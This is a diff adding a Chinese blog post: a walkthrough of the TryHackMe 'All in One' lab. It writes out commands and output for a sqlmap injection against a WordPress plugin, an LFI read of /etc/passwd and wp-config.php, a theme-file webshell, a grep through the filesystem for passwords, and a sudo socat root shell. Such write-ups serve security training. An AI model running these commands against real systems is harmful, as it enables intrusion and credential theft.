@@ -1,0 +1,367 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_All in One | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="All in One题目描述 这个靶机的目的是帮助你练习几种系统漏洞利用方法。它包含一些预设的漏洞利用路径，以及一些非预设的获取 root 权限的路径。尝试发现并利用所有漏洞。不要仅仅按照预设路径来利用它，像专业人士一样进行破解，尽情享受破解的乐趣吧！  信息收集端口扫描   序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.49.131.187 21 FTP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_All in One">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_All%20in%20One.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="All in One题目描述 这个靶机的目的是帮助你练习几种系统漏洞利用方法。它包含一些预设的漏洞利用路径，以及一些非预设的获取 root 权限的路径。尝试发现并利用所有漏洞。不要仅仅按照预设路径来利用它，像专业人士一样进行破解，尽情享受破解的乐趣吧！  信息收集端口扫描   序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.49.131.187 21 FTP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-06-23T12:10:22.581Z">
+<meta property="article:modified_time" content="2026-06-23T12:10:22.582Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="wordpress">
+<meta property="article:tag" content="socat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_All%20in%20One.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"本文已于","messageNext":"天前发布，内容可能已过时，请注意甄别。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_All in One',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-06-23 20:10:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">134</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_All in One</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-23T12:10:22.581Z" title="发表于 2026-06-23 20:10:22">2026-06-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-23T12:10:22.582Z" title="更新于 2026-06-23 20:10:22">2026-06-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">997</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_All in One"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="All-in-One"><a href="#All-in-One" class="headerlink" title="All in One"></a>All in One</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>这个靶机的目的是帮助你练习几种系统漏洞利用方法。它包含一些预设的漏洞利用路径，以及一些非预设的获取 root 权限的路径。<br>尝试发现并利用所有漏洞。不要仅仅按照预设路径来利用它，像专业人士一样进行破解，尽情享受破解的乐趣吧！</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><table>
+<thead>
+<tr>
+<th align="left">序号</th>
+<th align="left">Host地址</th>
+<th align="left">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="left">状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">10.49.131.187</td>
+<td align="left">21</td>
+<td align="left">FTP</td>
+<td align="left">10.49.131.187:21</td>
+<td align="left"></td>
+<td align="left">Vsftpd 3.0.5</td>
+<td align="left">0</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">10.49.131.187</td>
+<td align="left">22</td>
+<td align="left">SSH</td>
+<td align="left">10.49.131.187:22</td>
+<td align="left"></td>
+<td align="left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.13</td>
+<td align="left">0</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">10.49.131.187</td>
+<td align="left">80</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.49.131.187/">http://10.49.131.187:80</a></td>
+<td align="left">Apache2 Ubuntu Default Page</td>
+<td align="left">Apache&#x2F;2.4.41 (Ubuntu)</td>
+<td align="left">200</td>
+</tr>
+</tbody></table>
+<ul>
+<li>FTP 可匿名登录，但目录为空</li>
+<li>80 端口为 Apache 默认页面</li>
+</ul>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.49.131.187</span><br><span class="line">wordpress            (Status: 301) [Size: 318] [--&gt; http://10.49.131.187/wordpress/]</span><br></pre></td></tr></table></figure>
+
+<h3 id="WordPress-站点分析"><a href="#WordPress-站点分析" class="headerlink" title="WordPress 站点分析"></a>WordPress 站点分析</h3><p>访问 <code>/wordpress</code>，只有一篇文章，作者为 <strong>elyana</strong>：</p>
+<p>![](..&#x2F;image&#x2F;TryHackMe_All in One&#x2F;file-20260622164515496.png)</p>
+<h3 id="WPScan-扫描结果"><a href="#WPScan-扫描结果" class="headerlink" title="WPScan 扫描结果"></a>WPScan 扫描结果</h3><p>关键信息汇总：</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>URL</strong></td>
+<td><code>http://10.49.131.187/wordpress</code></td>
+</tr>
+<tr>
+<td><strong>CMS 版本</strong></td>
+<td>WordPress 5.5.1（已过时）</td>
+</tr>
+<tr>
+<td><strong>服务器</strong></td>
+<td>Apache&#x2F;2.4.41 (Ubuntu)</td>
+</tr>
+<tr>
+<td><strong>主题</strong></td>
+<td>Twenty Twenty 1.5</td>
+</tr>
+<tr>
+<td><strong>XML-RPC</strong></td>
+<td>已开启</td>
+</tr>
+<tr>
+<td><strong>上传目录</strong></td>
+<td>可浏览 (<code>/wp-content/uploads/</code>)</td>
+</tr>
+<tr>
+<td><strong>WP-Cron</strong></td>
+<td>已暴露</td>
+</tr>
+<tr>
+<td><strong>插件</strong></td>
+<td>mail-masta 1.0、reflex-gallery 3.1.7</td>
+</tr>
+<tr>
+<td><strong>已知风险</strong></td>
+<td>WordPress 版本过时、mail-masta 存在 LFI 漏洞</td>
+</tr>
+</tbody></table>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="插件漏洞"><a href="#插件漏洞" class="headerlink" title="插件漏洞"></a>插件漏洞</h3><table>
+<thead>
+<tr>
+<th>插件</th>
+<th>漏洞</th>
+<th>Exploit-DB</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Mail Masta 1.0</td>
+<td>SQL 注入</td>
+<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41438">#41438</a></td>
+</tr>
+<tr>
+<td>Mail Masta 1.0</td>
+<td>LFI</td>
+<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40290">#40290</a></td>
+</tr>
+<tr>
+<td>Reflex Gallery 3.1.3</td>
+<td>任意文件上传</td>
+<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/36374">#36374</a></td>
+</tr>
+</tbody></table>
+<p>Reflex Gallery 任意文件上传失败，转向 Mail Masta。</p>
+<h3 id="SQL-注入-—-获取用户凭据"><a href="#SQL-注入-—-获取用户凭据" class="headerlink" title="SQL 注入 — 获取用户凭据"></a>SQL 注入 — 获取用户凭据</h3><p><strong>获取数据库</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# sqlmap -u &quot;http://10.49.131.187/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&amp;pl=/var/www/html/wordpress/wp-load.php&quot; -p list_id --dbs</span><br><span class="line"></span><br><span class="line">available databases [2]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] wordpress</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取 wp_users 表</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─# sqlmap ... -D wordpress -T wp_users --dump</span><br><span class="line"></span><br><span class="line">| ID | user_login | user_pass                          | user_email    |</span><br><span class="line">|----|------------|------------------------------------|---------------|</span><br><span class="line">| 1  | elyana     | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | none@none.com |</span><br></pre></td></tr></table></figure>
+
+<h3 id="LFI-—-读取-wp-config-php"><a href="#LFI-—-读取-wp-config-php" class="headerlink" title="LFI — 读取 wp-config.php"></a>LFI — 读取 wp-config.php</h3><p>先验证 LFI 存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# curl &quot;http://10.49.131.187/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd&quot;</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>使用 php:&#x2F;&#x2F;filter 读取 wp-config.php（base64 编码）后解码，获取明文密码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;elyana&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;H@ckme@123&#x27;</span> );</span><br></pre></td></tr></table></figure>
+
+<h3 id="WordPress-后台-Getshell"><a href="#WordPress-后台-Getshell" class="headerlink" title="WordPress 后台 Getshell"></a>WordPress 后台 Getshell</h3><p>使用 <code>H@ckme@123</code> 登录 <code>/wp-login</code>，进入<a target="_blank" rel="noopener" href="http://10.49.131.187/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen">主题编辑页面</a>，将 <code>404.php</code> 替换为 webshell：</p>
+<p>![](..&#x2F;image&#x2F;TryHackMe_All in One&#x2F;file-20260622172822735.png)</p>
+<p>访问 webshell：<code>/wordpress/wp-content/themes/twentynineteen/404.php</code></p>
+<p>![](..&#x2F;image&#x2F;TryHackMe_All in One&#x2F;file-20260622173122650.png)</p>
+<h2 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h2><h3 id="hint-txt-提示"><a href="#hint-txt-提示" class="headerlink" title="hint.txt 提示"></a>hint.txt 提示</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-49-131-187:/home/elyana# cat hint.txt</span><br><span class="line">Elyana&#x27;s user password is hidden in the system. Find it ;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="hackathons-文件线索"><a href="#hackathons-文件线索" class="headerlink" title="hackathons 文件线索"></a>hackathons 文件线索</h3><p>网站目录下发现加密密码，salt 提示为 Vinegar：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Damn how much I hate the smell of <span class="tag">&lt;<span class="name">i</span>&gt;</span>Vinegar <span class="tag">&lt;/<span class="name">i</span>&gt;</span> :/ !!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Dvc W@iyur@123 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- KeepGoing --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>多次尝试解密未果，最终通过全局搜索找到密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-49-131-187:/var/www/html# grep -r &quot;pass&quot; / 2&gt;/dev/null</span><br><span class="line">/etc/mysql/conf.d/private.txt:password: E@syR18ght</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/桌面]</span><br><span class="line">└─# ssh elyana@10.49.131.187</span><br><span class="line">elyana@ip-10-49-131-187:~$ id</span><br><span class="line">uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权：elyana-→-root"><a href="#提权：elyana-→-root" class="headerlink" title="提权：elyana → root"></a>提权：elyana → root</h2><h3 id="sudo-权限"><a href="#sudo-权限" class="headerlink" title="sudo 权限"></a>sudo 权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elyana@ip-10-49-131-187:~$ sudo -l</span><br><span class="line">User elyana may run the following commands on ip-10-49-131-187:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/socat</span><br></pre></td></tr></table></figure>
+
+<h3 id="socat-提权"><a href="#socat-提权" class="headerlink" title="socat 提权"></a>socat 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">elyana@ip-10-49-131-187:~$ sudo socat stdin exec:/bin/bash</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>旧版靶场中 <code>/bin/bash</code> 存在 SUID 权限，可直接 <code>bash -p</code> 提权。当前版本已修复（文件时间从 2019 变为 2022，可能是靶场更新）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@ip-10-49-131-187:/var/www/html$ ls -lh /bin/bash</span><br><span class="line">-rwxr-xr-x 1 root root 1.2M Apr 18  2022 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>![](..&#x2F;image&#x2F;TryHackMe_All in One&#x2F;file-20260622181652149.png)</p>
+<hr>
+<h2 id="攻击路径总结"><a href="#攻击路径总结" class="headerlink" title="攻击路径总结"></a>攻击路径总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WordPress SQL 注入 + LFI</span><br><span class="line">    ↓ Mail Masta 插件漏洞 → 获取 wp-config.php 明文密码</span><br><span class="line">elyana (WordPress 后台 → webshell → SSH)</span><br><span class="line">    ↓ sudo socat stdin exec:/bin/bash</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io">X9wd09ncc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://x9wd09ncc.github.io/post/TryHackMe_All%20in%20One.html">https://x9wd09ncc.github.io/post/TryHackMe_All%20in%20One.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://x9wd09ncc.github.io" target="_blank">X9wd09ncc</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/thm/">thm</a><a class="post-meta__tags" href="/tags/easy/">easy</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E9%98%9F/">红队</a><a class="post-meta__tags" href="/tags/lfi/">LFI</a><a class="post-meta__tags" href="/tags/wordpress/">wordpress</a><a class="post-meta__tags" href="/tags/socat/">socat</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/TryHackMe_Easy%20Peasy.html" title="TryHackMe_Easy Peasy"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">TryHackMe_Easy Peasy</div></div></a></div><div class="next-post pull-right"><a href="/post/TryHackMe_Mustacchio.html" title="TryHackMe_Mustacchio"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">TryHackMe_Mustacchio</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/TryHackMe_Archangel.html" title="TryHackMe_Archangel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-15</div><div class="title">TryHackMe_Archangel</div></div></a></div><div><a href="/post/TryHackMe_Cheese_CTF.html" title="TryHackMe_Cheese CTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-05</div><div class="title">TryHackMe_Cheese CTF</div></div></a></div><div><a href="/post/TryHackMe_Team.html" title="TryHackMe_Team"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-27</div><div class="title">TryHackMe_Team</div></div></a></div><div><a href="/post/TryHackMe_Agent_T.html" title="TryHackMe_Agent_T"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-25</div><div class="title">TryHackMe_Agent_T</div></div></a></div><div><a href="/post/TryHackMe_Anthem.html" title="TryHackMe_Anthem"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-14</div><div class="title">TryHackMe_Anthem</div></div></a></div><div><a href="/post/TryHackMe_Blueprint.html" title="TryHackMe_Blueprint"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-12</div><div class="title">TryHackMe_Blueprint</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#All-in-One"><span class="toc-number">1.</span> <span class="toc-text">All in One</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 